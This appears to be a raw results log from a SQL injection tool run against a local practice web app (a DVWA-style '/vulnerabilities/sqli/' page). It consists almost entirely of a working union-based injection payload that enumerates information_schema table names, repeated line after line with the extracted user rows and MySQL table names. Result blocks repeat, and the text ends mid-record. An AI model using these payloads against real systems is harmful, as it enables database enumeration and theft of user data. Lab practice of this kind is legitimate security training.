ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_TABLESPACES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_INDEXES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_BUFFER_PAGE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_VIRTUAL
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: user_variables
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_TABLESPACES_ENCRYPTION
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_LOCK_WAITS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: THREAD_POOL_STATS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: users
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: guestbook
Surname: 
--- End of Extracted Results ---

Database: mysql
URL: http://localhost:4280/vulnerabilities/sqli/
Payload: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
Input: id
--- Extracted Results ---
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: admin
Surname: admin
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: Gordon
Surname: Brown
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: Hack
Surname: Me
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: Pablo
Surname: Picasso
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: Bob
Surname: Smith
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: ALL_PLUGINS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: APPLICABLE_ROLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: CHARACTER_SETS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: CHECK_CONSTRAINTS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: COLLATIONS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: COLLATION_CHARACTER_SET_APPLICABILITY
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: COLUMNS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: COLUMN_PRIVILEGES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: ENABLED_ROLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: ENGINES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: EVENTS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: FILES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: GLOBAL_STATUS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: GLOBAL_VARIABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: KEYWORDS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: KEY_CACHES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: KEY_COLUMN_USAGE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: OPTIMIZER_TRACE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PARAMETERS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PARTITIONS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PLUGINS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PROCESSLIST
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PROFILING
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: REFERENTIAL_CONSTRAINTS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: ROUTINES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SCHEMATA
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SCHEMA_PRIVILEGES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SESSION_STATUS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SESSION_VARIABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SQL_FUNCTIONS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SYSTEM_VARIABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLESPACES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLE_CONSTRAINTS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLE_PRIVILEGES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TRIGGERS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: USER_PRIVILEGES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: VIEWS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: CLIENT_STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INDEX_STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_CONFIG
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: GEOMETRY_COLUMNS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_TABLESTATS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SPATIAL_REF_SYS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: USER_STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_TRX
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMP_PER_INDEX
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_METRICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_DELETED
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMP
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: THREAD_POOL_WAITS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMP_RESET
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: THREAD_POOL_QUEUES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLE_STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_FIELDS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_BUFFER_PAGE_LRU
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_LOCKS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_INDEX_TABLE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMPMEM
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: THREAD_POOL_GROUPS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMP_PER_INDEX_RESET
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_FOREIGN_COLS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_INDEX_CACHE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_BUFFER_POOL_STATS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_BEING_DELETED
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_FOREIGN
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMPMEM_RESET
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_DEFAULT_STOPWORD
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_TABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_COLUMNS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_TABLESPACES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_INDEXES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_BUFFER_PAGE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_VIRTUAL
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: user_variables
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_TABLESPACES_ENCRYPTION
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_LOCK_WAITS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: THREAD_POOL_STATS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: users
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: guestbook
Surname: 
--- End of Extracted Results ---

Database: mysql
URL: http://localhost:4280/vulnerabilities/sqli/
Payload: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
Input: id
--- Extracted Results ---
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: admin
Surname: admin
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: Gordon
Surname: Brown
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: Hack
Surname: Me
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: Pablo
Surname: Picasso
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: Bob
Surname: Smith
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: ALL_PLUGINS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: APPLICABLE_ROLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: CHARACTER_SETS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: CHECK_CONSTRAINTS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: COLLATIONS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: COLLATION_CHARACTER_SET_APPLICABILITY
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: COLUMNS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: COLUMN_PRIVILEGES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: ENABLED_ROLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: ENGINES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: EVENTS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: FILES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: GLOBAL_STATUS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: GLOBAL_VARIABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: KEYWORDS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: KEY_CACHES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: KEY_COLUMN_USAGE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: OPTIMIZER_TRACE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PARAMETERS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PARTITIONS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PLUGINS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PROCESSLIST
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PROFILING
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: REFERENTIAL_CONSTRAINTS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: ROUTINES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SCHEMATA
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SCHEMA_PRIVILEGES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SESSION_STATUS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SESSION_VARIABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SQL_FUNCTIONS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SYSTEM_VARIABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLESPACES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLE_CONSTRAINTS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLE_PRIVILEGES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TRIGGERS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: USER_PRIVILEGES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: VIEWS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: CLIENT_STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INDEX_STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_CONFIG
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: GEOMETRY_COLUMNS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_TABLESTATS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SPATIAL_REF_SYS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: USER_STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_TRX
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMP_PER_INDEX
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_METRICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_DELETED
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMP
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: THREAD_POOL_WAITS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMP_RESET
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: THREAD_POOL_QUEUES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLE_STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_FIELDS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_BUFFER_PAGE_LRU
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_LOCKS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_INDEX_TABLE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMPMEM
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: THREAD_POOL_GROUPS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMP_PER_INDEX_RESET
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_FOREIGN_COLS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_INDEX_CACHE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_BUFFER_POOL_STATS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_BEING_DELETED
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_FOREIGN
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMPMEM_RESET
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_DEFAULT_STOPWORD
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_TABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_COLUMNS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_TABLESPACES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_INDEXES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_BUFFER_PAGE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_VIRTUAL
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: user_variables
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_TABLESPACES_ENCRYPTION
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_LOCK_WAITS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: THREAD_POOL_STATS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: users
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: guestbook
Surname: 
--- End of Extracted Results ---

Database: mysql
URL: http://localhost:4280/vulnerabilities/sqli/
Payload: ' OR 1=1 UNION SELECT table_name FROM information_schema.tables #
Input: id
--- Extracted Results ---
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: admin
Surname: admin
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: Gordon
Surname: Brown
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: Hack
Surname: Me
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: Pablo
Surname: Picasso
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: Bob
Surname: Smith
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: ALL_PLUGINS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: APPLICABLE_ROLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: CHARACTER_SETS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: CHECK_CONSTRAINTS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: COLLATIONS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: COLLATION_CHARACTER_SET_APPLICABILITY
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: COLUMNS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: COLUMN_PRIVILEGES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: ENABLED_ROLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: ENGINES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: EVENTS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: FILES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: GLOBAL_STATUS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: GLOBAL_VARIABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: KEYWORDS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: KEY_CACHES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: KEY_COLUMN_USAGE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: OPTIMIZER_TRACE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PARAMETERS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PARTITIONS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PLUGINS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PROCESSLIST
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PROFILING
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: REFERENTIAL_CONSTRAINTS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: ROUTINES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SCHEMATA
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SCHEMA_PRIVILEGES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SESSION_STATUS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SESSION_VARIABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SQL_FUNCTIONS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SYSTEM_VARIABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLESPACES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLE_CONSTRAINTS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLE_PRIVILEGES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TRIGGERS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: USER_PRIVILEGES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: VIEWS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: CLIENT_STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INDEX_STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_CONFIG
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: GEOMETRY_COLUMNS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_TABLESTATS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SPATIAL_REF_SYS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: USER_STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_TRX
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMP_PER_INDEX
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_METRICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_DELETED
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMP
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: THREAD_POOL_WAITS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMP_RESET
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: THREAD_POOL_QUEUES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLE_STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_FIELDS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_BUFFER_PAGE_LRU
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_LOCKS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_INDEX_TABLE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMPMEM
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: THREAD_POOL_GROUPS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMP_PER_INDEX_RESET
Surname: 
